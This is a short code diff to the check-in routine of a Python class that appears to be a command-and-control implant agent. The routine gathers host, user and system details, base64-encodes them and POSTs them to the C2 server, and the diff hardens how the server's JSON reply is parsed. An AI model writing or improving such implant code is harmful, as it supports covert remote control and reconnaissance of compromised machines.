@@ -176,7 +176,7 @@ class igider:
             "os": self.getOSVersion(),
             "user": self.getUsername(),
             "host": hostname,
-            "domain:": socket.getfqdn(),
+            "domain": socket.getfqdn(),
             "pid": os.getpid(),
             "uuid": self.agent_config["PayloadUUID"],
             "architecture": "x64" if sys.maxsize > 2**32 else "x86",
@@ -185,11 +185,18 @@ class igider:
         }
         encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + json.dumps(data).encode())
         decoded_data = self.makeRequest(encoded_data, 'POST')
-        if("status" in decoded_data):
-            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
-            self.agent_config["UUID"] = UUID
-            return True
-        else: return False
+        try:
+            # Decode the bytes object to a string and parse as JSON
+            decoded_str = decoded_data.decode('utf-8')
+            parsed_data = json.loads(decoded_str.replace(self.agent_config["PayloadUUID"], ""))
+            if "status" in parsed_data:
+                UUID = parsed_data["id"]
+                self.agent_config["UUID"] = UUID
+                return True
+            else:
+                return False
+        except (json.JSONDecodeError, UnicodeDecodeError):
+            return False
 
         """
         Makes an HTTP or HTTPS request to the command and control server.
